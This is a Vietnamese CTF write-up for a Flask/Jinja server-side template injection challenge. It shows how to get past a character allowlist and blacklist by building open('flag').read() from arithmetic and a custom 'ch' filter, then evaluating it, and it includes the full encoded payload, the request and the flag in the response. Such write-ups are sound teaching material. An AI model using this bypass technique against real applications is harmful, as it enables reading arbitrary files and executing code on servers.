# super-secure-translation-implementation challenge

Khi mình làm đến challenge này thì thời gian cuộc thi cũng sắp hết. Đến khi kết thúc mình vẫn chưa giải ra, server vẫn chưa đóng nên mình vẫn cố giải quyết nó vì đây là thử thách liên quan đến SSTI
flask/jinja.

## Recon
Thử thách cung cấp một file docker có các routes như sau:
```
@server.route("/") => app.py 
@server.route("/<path>") => app.py if the resource is nonexistent
@server.route("/secure_translate/") => print(f"Payload parsed: {payload}") - payload parameter is user controlled input. Vulnerable to SSTI.
```
File docker cho thấy rằng tất cả các file đều nằm trong thư mục gốc của web, vì vậy chỉ cần điều hướng đến trực tiếp thông qua trình duyệt.

Trong `/check.py` có một allowList được sử dụng cho payload

`allowList = ["b", "c", "d", "e", "h", "l", "o", "r", "u", "1", "4", "6", "*", "(", ")", "-", "+", "'", "|", "{", "}"]
`
Do đó sử dụng một trong các kí tự không có trong list sẽ gây ra lỗi.

## Filter

1. Ngoài ra ứng dụng còn có bộ lọc jinja tùy chỉnh:

```
# Add filters to the jinja environment to add string
# manipulation capabilities
server.jinja_env.filters["u"] = uppercase
server.jinja_env.filters["l"] = lowercase
server.jinja_env.filters["b64d"] = b64d
server.jinja_env.filters["order"] = order
server.jinja_env.filters["ch"] = character
server.jinja_env.filters["e"] = e
```

2. Thêm một số chuỗi khác trong blacklist

Trong `/filter.py` thêm một bộ lọc khác bằng cách đưa vào blacklist một số strings được chuyển đến eval: 
```
forbidlist = [" ", "=", ";", "\n", ".globals", "exec"]
```

Ngoài ra, 4 ký tự đầu tiên không thể là "open" và "eval": 

```
if x[0:4] == "open" or x[0:4] == "eval":
  return "Not That Easy ;)"
```
Ứng dụng chỉ cho phép tối đa 161 kí tự, nhiều thế nên thôi tạm bỏ qua.

## Exploitation

Chỉ sử dụng các ký tự trong danh sách cho phép là không đủ để tạo ra payload khai thác, 
vì vậy phải làm thế nào để mở rộng bảng chữ cái của mình bằng cách sử dụng số học cơ bản và bộ lọc jinja để chuyển đổi chuỗi.
Trong jinja các biến có thể được sửa đổi bằng bộ lọc . Các bộ lọc được tách ra khỏi biến bởi một ký tự `|`  và có thể có các đối số tùy chọn trong dấu ngoặc đơn. 
Nhiều bộ lọc có thể được xâu chuỗi. Đầu ra của một bộ lọc là áp dụng cho tiếp theo. 

Ví dụ, {{ name|striptags|title }}sẽ xóa tất cả các thẻ HTML khỏi biến name và title-case và đầu ra sẽ xử lí như sau ( title(striptags(name))).

Trong python 'ch' filter trả về một kí tự dựa trên số ascii

```
>>> print(chr(103))
g
```
Trong thử thách này chỉ sử dụng được các chữ cái trong allowlist là : 1, 4, 6. Nhưng như thế là đủ vì mình có thể cộng trừ các số để thành một số phù hợp.

Payload của mình có dạng: `{{\ropen('flag').read()}}` (`/n` cũng khả thi)

tương đương với: 
```
{{((6%2b6)|ch%2b'o'%2b(111%2b1)|ch%2b'e'%2b(111-1)|ch%2b'("'%2b(46%2b1)|ch%2b(61%2b41)|ch%2b'l'%2b(111-14)|ch%2b(61%2b41%2b1)|ch%2b'"'%2b')'%2b46|ch%2b're'%2b(111-14)|ch%2b'd()')|e}}
```

Gửi requests và nhận được flag trong phần reponse:

```
GET /secure_translate/?payload={{((6%2b6)|ch%2b'o'%2b(111%2b1)|ch%2b'e'%2b(111-1)|ch%2b'("'%2b(46%2b1)|ch%2b(61%2b41)|ch%2b'l'%2b(111-14)|ch%2b(61%2b41%2b1)|ch%2b'"'%2b')'%2b46|ch%2b're'%2b(111-14)|ch%2b'd()')|e}} HTTP/2

Host: super-secure-translation-implementation.chals.damctf.xyz

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Dnt: 1

Upgrade-Insecure-Requests: 1

Sec-Gpc: 1

Te: trailers

.
.
.

HTTP/2 200 OK

Content-Type: text/html; charset=utf-8

Date: Tue, 09 Nov 2021 16:01:30 GMT

Server: gunicorn

Content-Length: 744

   <code>
   
      <p>dam{p4infu1_all0wl1st_w3ll_don3}
      
</p><a href="/">Take Me Home</a>

    </code>
```


Ref : [jinja filter](https://jinja.palletsprojects.com/en/3.0.x/templates/#filters)


